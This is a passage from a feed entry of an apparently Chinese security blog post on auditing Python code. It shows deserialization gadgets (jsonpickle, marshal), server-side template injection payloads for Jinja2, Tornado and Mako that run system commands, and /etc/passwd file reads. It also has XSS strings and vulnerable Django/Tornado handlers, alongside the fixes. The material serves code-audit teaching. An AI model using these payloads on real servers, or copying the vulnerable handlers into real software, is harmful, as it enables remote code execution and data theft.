function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">poc = jsonpickle.encode(EXP())  <span class="comment"># 把实例化的类转换成json数据</span></span><br><span class="line"><span class="built_in">print</span>(poc)</span><br></pre></td></tr></table></figure><p>然后直接调用<code>decode()</code>函数来执行即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jsonpickle.decode(<span class="string">&quot;&quot;&quot;&#123;&quot;py/reduce&quot;: [&#123;&quot;py/function&quot;: &quot;os.system&quot;&#125;, &#123;&quot;py/tuple&quot;: [&quot;whoami&quot;]&#125;]&#125;&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Marshal"><a href="#Marshal" class="headerlink" title="Marshal"></a>Marshal</h4><p>由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><div class="note warning modern"><p>这个包没办法直接执行命令，需要多方函数配合，有点鸡肋</p></div><p>如果直接dumps一个函数后然后再loads是没办法执行的，而是需要用到了 Python 的一个面向对象的特性，Python 能通过 <code>types.FunctionTyle(func_code,globals(),&#39;&#39;)()</code>来动态地创建匿名函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))  <span class="comment"># 到这边都没发执行</span></span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, <span class="built_in">globals</span>(), <span class="string">&#x27;&#x27;</span>)()  <span class="comment"># 动态构造后才可以执行</span></span><br></pre></td></tr></table></figure><p>如果需要执行需要配合<code>pickle.loads()</code>函数，和opcode打组合拳来实现</p><h4 id="Shelve"><a href="#Shelve" class="headerlink" title="Shelve"></a>Shelve</h4><p>太垃圾了，类似序列化一个函数一个定位的坐标，然后反序列化的时候加载这个坐标然后执行代码，必须要文件中有的代码才可以执行。相关的函数<code>shelve.open()</code></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p><p>推荐一个项目：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了<code>&#123;&#123;…&#125;&#125;</code>块，只要使用到这个包的代码只要不注意处理都会照成漏洞，下面一django来举例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&#123;&#123;11*10&#125;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br><span class="line">    <span class="comment"># 注入修复</span></span><br><span class="line">    <span class="comment"># t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># return t.render(n=name)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/2.png" alt="image-20220925200355896"></p><p>然后我们可以利用之前上面所写的<strong>魔术方法</strong>方法来注入即可达成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2和python3通用代码</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line"><span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span>:</span><br><span class="line">c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><p>换成模板注入就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;_IterationGuard&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/3.png" alt="image-20220925200940851"></p><p>或者换成__globals__模块来是用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# python2和python3通用代码 #&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/4.png" alt="image-20220925201235467"></p><h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;…&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.template</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line">TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt; Hello ascotbe &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        name = self.get_argument(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        template_data = TEMPLATE.replace(<span class="string">&quot;ascotbe&quot;</span>,name)</span><br><span class="line">        t = tornado.template.Template(template_data)</span><br><span class="line">        self.write(t.generate(name=name))</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([</span><br><span class="line">    (<span class="string">r&quot;/&quot;</span>, MainHandler),</span><br><span class="line">], debug=<span class="literal">True</span>, static_path=<span class="literal">None</span>, template_path=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    application.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure><p>xss代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/?name=hi%3Cimg%20src=1%20onerror=alert(%22xss%22);%3E</span><br></pre></td></tr></table></figure><p>注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/?name=&#123;%import os%&#125;&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="Mako"><a href="#Mako" class="headerlink" title="Mako"></a>Mako</h4><p>mako 本身可以完美支持 Python 语句，所以利用 <code>&lt;% %&gt;</code>、<code>&lt;%! %&gt;</code>、<code>$&#123;&#125;</code> 可以非常轻松地进行攻，还有进行结构控制的<code>%for ... : %endfor</code>、<code>%if ... : ... %elif: ... % else: ... %endif</code>。自定义函数<code>&lt;%def name=&quot;...&quot; &gt; ... &lt;/%def&gt;</code>，调用：<code>$&#123;...()&#125;</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&#123;&#123;11*10&#125;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    t = Template(<span class="string">&quot;Hello,&quot;</span>+name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br></pre></td></tr></table></figure><p>进行代码执行，没有回显</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)%&gt;</span><br><span class="line">$&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>对于XXE问题只需要设置<code>resolve_entities</code>为<code>False</code>即可解决漏洞，如果没有设置的都能够执行命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br><span class="line">tree = etree.fromstring(xml,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs;codecs.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">file(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="Server-Side-Request"><a href="#Server-Side-Request" class="headerlink" title="Server Side Request"></a>Server Side Request</h2><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>是否默认跟随重定向</p><ul><li>pycurl（不跟随）</li><li>urllib/urllib2/requests（跟随）</li></ul><p>默认最大重定向次数</p><ul><li>pycurl（未限制）</li><li>urllib/urllib2（10次）</li><li>requests（30次）</li></ul><h3 id="协议支持"><a href="#协议支持" class="headerlink" title="协议支持"></a>协议支持</h3><ul><li><p>urllib/urllib2：分别有协议类型http、https、ftp、file</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">a= request.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">a=urllib.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line">b=urllib2.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b.read())</span><br></pre></td></tr></table></figure></li><li><p>requests：分别有协议类型http、https、ftp</p></li><li><p>pycurl：分别有协议类型dict、file、ftp、ftps、gopher、http、https、imap、imaps、ldap、ldaps、pop3、pop3s、rtmp、rtsp、scp、sftp、smtp、smtps、telnet和tftp。libcurl支持ssl证书、http-post、http-put、ftp上传、基于http表单的上传、代理、cookie、用户+密码认证（basic、digest、ntlm、negotiate、kerberos4）、文件传输恢复、http代理隧道等</p></li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>未对输入和输出做过滤，以Django举例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;hello %s&#x27;</span> %(name))</span><br><span class="line">    <span class="comment"># return render(&#x27;hello.html&#x27;, &#123;&#x27;name&#x27;:name&#125;)  # Django3以上正确的代码 </span></span><br></pre></td></tr></table></figure><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>安全的写法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stmt = <span class="string">&quot;SELECT * FROM table WHERE id=?&quot;</span></span><br><span class="line">connection.execute(stmt, (value,))</span><br></pre></td></tr></table></figure><p>不安全的写法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;SELECT * FROM table WHERE id=&quot;</span> + value</span><br><span class="line"><span class="string">&quot;SELECT * FROM table WHERE id=%s&quot;</span> % value</span><br><span class="line"><span class="string">&quot;SELECT * FROM table WHERE id=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(value)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</span><br><span class="line">https://github.com/bit4woo/python_sec</span><br><span class="line">https://www.cnblogs.com/bmjoker/p/13508538.html</span><br><span class="line">https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</span><br><span class="line">https://www.cnblogs.com/damoxilai/p/16707055.html</span><br><span class="line">https://mp.weixin.qq.com/s/Tb2e_2ihuMP3mWtrPtuFUQ</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="代码审计" scheme="https://www.ascotbe.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Python" scheme="https://www.ascotbe.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Python/"/>
    
    
    <category term="代码审计" scheme="https://www.ascotbe.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
